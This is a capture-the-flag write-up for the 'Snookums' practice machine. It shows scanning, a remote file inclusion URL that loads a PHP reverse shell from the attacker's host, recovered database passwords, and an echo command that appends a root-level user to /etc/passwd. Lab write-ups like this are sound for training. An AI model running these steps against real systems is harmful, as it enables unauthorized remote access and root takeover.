---
description: Pg Practice Snookums writeup
---

# Snookums

## Nmap

```
sudo nmap 192.168.230.58 -p- -sS -sV

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx?
Service Info: Host: SNOOKUMS; OS: Unix
```

Port 80 directs us to index.php for Simple PHP Photo Gallery. As we can see at the footer of the page we are on v08.

![](<../../../.gitbook/assets/image (1041).png>)

Running `dirsearch.py` against the target website produces the following found directories:

```
python3 dirsearch.py -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 60 --full-url
```

![](<../../../.gitbook/assets/image (1042).png>)

Of the directories none are of particular interest so far after manual inspection. Searching on Google for exploits we do have a public exploit for RFI on v0.7.

{% embed url="https://www.exploit-db.com/exploits/48424" %}

As per the exploit page the PoC for this is:

```
 site.com/image.php?img= [ PAYLOAD ]
```

Browsing to image.php shows the following:

![](<../../../.gitbook/assets/image (1043).png>)

From here we can test RFI by starting a `Python SimpleHTTPServer` on our attacking machine and try to browse to a test.txt file which contains the contents 'hello'.

```
http://192.168.230.58/image.php?img=http://192.168.49.230/test.txt
```

![](<../../../.gitbook/assets/image (1044).png>)

As this has worked for us and we know the target is running PHP we can attempt a PHP reverse shell. I set a PHP Reverse shell to listen in on port 21 then browsed to it at:

```
http://192.168.230.58/image.php?img=http://192.168.49.230/phpshell.php
```

Which resulted in a shell.

![](<../../../.gitbook/assets/image (1045).png>)

Browsing /var/www/html shows a db.php file. Reading the contents of this provides us with login information for MySQL.

![](<../../../.gitbook/assets/image (1046).png>)

Once logged into MySQL locally we can see a database called 'SimplePHPGal'. Selecting the database and showing the tables reveals the 'users' tables. Selecting all columns from this provides us with some usernames and base64 values.

![](<../../../.gitbook/assets/image (1047).png>)

These values need to be decoded twice to view the plaintext value:

![](<../../../.gitbook/assets/image (1048).png>)

| Username | Password                |
| -------- | ----------------------- |
| josh     | MobilizeHissSeedtime747 |
| michael  | HockSydneyCertify123    |
| serena   | OverallCrestLean000     |

Viewing the contents of /etc/passwd shows two outstanding users, michael and GitRekt.

![](<../../../.gitbook/assets/image (1049).png>)

We can then attempt to `SSH` in as michael with the potential credentials.

![](<../../../.gitbook/assets/image (1051) (1).png>)

Linpeas reports the /etc/passwd file is writeable by us.

![](<../../../.gitbook/assets/image (1053).png>)

Knowing this we can setup a new root user to be created.

Generate password on attacking machine:

```
openssl passwd -1 -salt password password 
```

Echo the password and new user to the end of /etc/passwd on the target machine.

```
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
```

`su` to new user:

![](<../../../.gitbook/assets/image (1052).png>)
